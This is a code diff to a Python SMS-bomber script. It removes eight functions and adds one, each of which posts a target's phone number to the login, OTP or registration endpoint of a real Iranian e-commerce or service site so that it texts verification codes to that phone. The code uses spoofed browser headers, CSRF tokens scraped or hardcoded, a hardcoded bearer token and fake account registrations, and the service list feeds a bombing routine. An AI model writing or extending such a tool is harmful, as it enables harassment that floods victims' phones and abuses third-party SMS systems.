@@ -53,355 +53,49 @@ def check_internet():
 # SMS Service
 # ------------------------------
 
-
-def mo7_ir(phone):
+def alldigitall(phone):
     import requests
     
     formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://mo7.ir/bakala/ajax/send_code/"
+    url = "https://api.alldigitall.ir/v1/auth/register?store_id=0"
     
     payload = {
-        "action": "bakala_send_code",
-        "phone_email": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-CSRF-TOKEN": "b5ea5c0516",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://mo7.ir",
-        "Referer": "https://mo7.ir/",
-    }
-    
-    try:
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(mo7_ir) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (mo7_ir) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] mo7_ir Exception: {e}{a}')
-        return False
-        
-
-def dgshahr(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://lend-b.dgshahr.com/user/login/"
-    
-    payload = {
-        "phone_number": formatted_phone,
-        "source": "google-organic",
-        "campaign": "undefined"
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://lend-b.dgshahr.com",
-        "Referer": "https://lend-b.dgshahr.com/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(dgshahr) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (dgshahr) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] dgshahr Exception: {e}{a}')
-        return False
-
-
-
-def torobpay(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://api.torobpay.com/user/v1/login/?source=mobile&http_referrer=https%3A%2F%2Fwww.google.com%2F"
-    
-    payload = {
-        "phone_number": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "X-CSRFTOKEN": "",
-        "Origin": "https://torobpay.com",
-        "Referer": "https://torobpay.com/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(torobpay) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (torobpay) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] torobpay Exception: {e}{a}')
-        return False
-
-def malltina(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://api.malltina.com/profiles"
-    
-    payload = {
-        "password": "mM12345678",
+        "firstname": "نام",
+        "lastname": "خانوادگی", 
         "mobile": formatted_phone,
-        "sign_up_referral_link": "https://www.google.com/"
+        "password": "12345678",
+        "password_confirmation": "12345678"
     }
     
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
+        "Accept": "application/json",
         "Content-Type": "application/json",
-        "Origin": "https://www.malltina.com",
-        "Referer": "https://www.malltina.com/",
+        "Origin": "https://alldigitall.ir",
+        "Referer": "https://alldigitall.ir/",
     }
     
     try:
         response = requests.post(url, json=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
-            print(f'{g}(malltina) {a}Code Sent')
+            print(f'{g}(alldigitall) {a}Code Sent')
             return True
         else:
-            print(f'{r}[-] (malltina) HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] (alldigitall) HTTP Error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] malltina Exception: {e}{a}')
+        print(f'{r}[!] alldigitall Exception: {e}{a}')
         return False
 
-
-def missomister(phone):
-    import requests
-    import re
-    
-    digits_phone = phone.replace("+98", "")
-    
-    try:
-        session = requests.Session()
-        home_response = session.get("https://www.missomister.com/", timeout=10)
-        
-        # استخراج CSRF_TOKEN
-        csrf_token = None
-        csrf_patterns = [
-            r'name="csrf" value="([a-f0-9]+)"',
-            r'name="dig_nounce" value="([a-f0-9]+)"'
-        ]
-        
-        for pattern in csrf_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                csrf_token = match.group(1)
-                break
-        
-        if not csrf_token:
-            csrf_token = "7bc87785e8"
-        
-        url = "https://www.missomister.com/wp-admin/admin-ajax.php"
-        
-        payload = {
-            "action": "digits_check_mob",
-            "countrycode": "+98",
-            "mobileNo": digits_phone,
-            "csrf": csrf_token,
-            "login": "2",
-            "username": "",
-            "email": "",
-            "captcha": "",
-            "captcha_ses": "",
-            "json": "1",
-            "whatsapp": "0"
-        }
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://www.missomister.com",
-            "Referer": "https://www.missomister.com/",
-        }
-        
-        response = session.post(url, data=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            if response.text.strip() == "1":
-                print(f'{g}(missomister) {a}Code Sent')
-                return True
-        
-        print(f'{r}[-] (missomister) Failed{a}')
-        return False
-            
-    except Exception:
-        print(f'{r}[-] (missomister) Failed{a}')
-        return False
-
-
-def candom_shop(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://candom.shop/bakala/ajax/send_code/"
-    
-    payload = {
-        "action": "bakala_send_code",
-        "phone_email": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-CSRF-TOKEN": "7aae5b22e1",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://candom.shop",
-        "Referer": "https://candom.shop/",
-    }
-    
-    try:
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-        
-        if response.status_code == 200:
-            print(f'{g}(candom_shop) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (candom_shop) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] candom_shop Exception: {e}{a}')
-        return False
-        
-
-def tapsi_food(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://api.tapsi.food/v1/api/Authentication/otp"
-    
-    payload = {
-        "cellPhone": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWVzdElkIjoiZTc4ZjIwMzgtZjgzNi00MDA2LThjYzItYTYzY2YzMmI2OWY5IiwiVHlwZSI6Ikd1ZXN0IiwiRXhwaXJlSW4iOiIxMDgwMDAwMCIsIm5iZiI6MTc1NjI0Mzc1OCwiZXhwIjoxNzU2MjU0NTU4LCJpYXQiOjE3NTYyNDM3NTgsImlzcyI6Imh0dHBzOi8vbG9jYWxob3N0OjUwMDEiLCJhdWQiOiJodHRwczovL2xvY2FsaG9zdDo1MDAxIn0.FJnYvqwBa9za2y0SGANgFg_3PGNLeZkeCDPebJS0YTE",
-        "x-platform": "mobile",
-        "x-app-version": "v1.5.12-prd",
-        "Origin": "https://tapsi.food",
-        "Referer": "https://tapsi.food/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-        
-        if response.status_code == 200:
-            print(f'{g}(tapsi_food) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (tapsi_food) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] tapsi_food Exception: {e}{a}')
-        return False
-
-
-def banimode(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://mobapi.banimode.com/api/v2/auth/request"
-    
-    payload = {
-        "phone": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json;charset=utf-8",
-        "Origin": "https://www.banimode.com",
-        "Referer": "https://www.banimode.com/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-        
-        if response.status_code == 200:
-            print(f'{g}(banimode) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (banimode) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] banimode Exception: {e}{a}')
-        return False
-
-
-
-
-# ------------------------------
-# Service Runner
-# ------------------------------
-def send_service_safe(service, phone):
-    """Run SMS service safely with error handling"""
-    try:
-        result = service(phone)
-        if result:
-            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
-        else:
-            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
-    except Exception as e:
-        print(f"{r}[!] Error in {service.__name__}: {e}{a}")
 
 # ------------------------------
 # SMS Bomber
 # ------------------------------
 def Vip(phone, Time):
     services = [
-    banimode,
-    tapsi_food, 
-    candom_shop,
-    missomister,
-    torobpay,
-    malltina,
-    dgshahr,
-    mo7_ir,  # جایگزین 1001kharid
+    alldigitall,  # سرویس جدید
 ]
     total_services = len(services)
 
